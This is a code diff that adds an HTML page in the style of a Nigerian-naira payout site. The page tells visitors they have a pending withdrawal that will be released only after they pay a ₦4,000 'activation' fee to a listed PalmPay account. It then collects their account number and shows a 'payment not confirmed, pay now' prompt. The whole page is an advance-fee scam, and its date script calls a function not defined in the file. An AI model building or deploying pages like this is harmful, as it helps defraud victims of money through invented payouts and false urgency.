@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,600;1,500&family=Poppins:wght@400;600&display=swap');
+        
+        * {
+            padding: 0;
+            margin: 0;
+            /* font-family: 'Bitter', serif; */
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #000;
+            color: white;
+        }
+
+        .top {
+            width: 95%;
+            margin: 0 auto;
+        }
+
+        .top p {
+            padding-top: 17px;
+            padding-left: 7px;
+            font-size: 19px;
+        }
+
+        .top input, select, button {
+            width: 93%;
+            height: 49px;
+            border-radius: 9px;
+            border: 2px solid rgb(76, 2, 181);
+            background: none;
+            color: rgb(49, 49, 49);
+            margin: 0 auto;
+            display: block;
+        }
+
+        ::placeholder {
+            padding-left: 10px;
+            color: rgb(82, 79, 79);
+        }
+
+        option {
+            color: white;
+        }
+
+        .next {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            margin: 0 auto;
+           
+
+        }
+
+        .next button {
+            position: relative;
+            top: -20px;
+            background: rgb(76, 2, 181);
+            border: none;
+            border-radius: 30px;
+            height: 60px;
+            margin: 0 auto;
+        }
+
+        .next button span {
+            padding-left: 20px;
+            font-size: 18px;
+        }
+
+ 
+        
+
+        .box {
+            width: 95%;
+            height: 40vh;
+            margin: 0 auto;
+           
+            background: #dbd6d6;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            bottom: 0 ;
+           
+        }
+
+        .loading  {
+            display: block;
+            margin: 0 auto;
+            position: relative;
+            top: 80px;
+        }
+        .time {
+        width:97%  ;
+        height: fit-content;
+        position: relative;
+        top: -20px;
+        background: none;
+       }
+        .time img{
+            width: 60%;
+            height: fit-content;
+            margin: 0 auto;
+            display: block;
+        }
+        .time p {
+            text-align: center;
+            color: #868686;
+        }
+
+        .acc {
+            width: 97%;
+            height: 290px;
+            margin: 0 auto;
+            background: #0e0d0d;
+            border: 1px solid rgb(111, 111, 111);
+            border-radius: 11px;
+            color: #969494;
+        }
+        .acc h2 {
+            padding-top: 14px;
+            font-size: 18px;
+            padding-left: 12px;
+        }
+        .acc span {
+          
+            padding-right: 12px;
+            color: white;
+        }
+       
+    </style>
+</head>
+<body>
+    <div class="top">
+        <p><strong>Activate Account</strong></p> <br>
+        <div class="time">
+            <p>You have a pending withdrawal of ₦<span style="color: none;" id="amountSpan"></span>  which was on <span id="datetime"></span> </p> <br> <br>
+
+            <p>Your payment will be approved upon activation. to activate, pay the sum of ₦4,000 to the account below and click confirm account</p>
+        </div>
+
+        <div class="acc">
+            <h2>Amount <span style="float: right;">₦4,000</span></h2><br><hr>
+            <h2>Account Number <span style="float: right;"> 9550803319</span></h2><br><hr>
+            <h2>Account Name <span style="float: right;">Dark Website </span></h2><br><hr>
+            <h2>Bank Name <span style="float: right;">PalmPay</span></h2><br>
+        </div>
+
+        <div class="box" id="boxContainer"> 
+            <p style="font-size: 30px; color: red; float: right; position: relative; top: -10px;padding-right: 20px;"><a href="" style="text-decoration: none; color: red;">x</a></p>
+            <p style="font-size: 20px; color: rgb(106, 106, 106);  position: relative; top: 40px;text-align: center;">Please confirm the account you want to receive your payment</p> <br> <br> <br>
+            <form action="" >
+                <input type="number" placeholder="Your Account Number" required> <br>
+                <div class="pay">
+                    <button type="button" style="color: white; background: #6d38d6;"id="popupButton"><span><b>Confirm Account</b></span></button>
+                </div>
+            </form>
+        </div>
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+                <div class="spinner"></div>
+            </div>
+        </div>
+    
+        <div id="confirmationModal" class="modal">
+            <div class="modal-content">
+                <img src="img/not.jpeg" alt="Confirmation Image">
+                <p style="color: black;">You Payment was not confirmed kindly  payment pay now</p>
+            </div>
+        </div>
+        
+        <div class="next">
+            <button type="button" id="activateButton" style="color: white;"  onclick="activateAccount()"><span><b>Confirm Account</b></span></button>
+        </div> <br> 
+    </div>
+    <script>
+     // Retrieve the amount from local storage
+     const amount = localStorage.getItem("withdrawAmount");
+
+// Set the amount in the span element
+const amountSpan = document.getElementById("amountSpan");
+amountSpan.textContent = amount;
+
+function activateAccount() {
+    const activateButton = document.getElementById("activateButton");
+    const boxContainer = document.getElementById("boxContainer");
+    
+    activateButton.style.display = "none";
+    boxContainer.style.display = "block";
+    
+    // Simulate a loading delay (replace this with your actual logic)
+    
+}
+
+function updateDateTime() {
+    const datetimeDiv = document.getElementById("datetime");
+    const currentDate = new Date();
+    const formattedDate = formatDate(currentDate);
+    datetimeDiv.textContent = formattedDate;
+}
+
+// Update the date and time every second
+setInterval(updateDateTime, 1000);
+
+// Initial update
+updateDateTime();
+
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
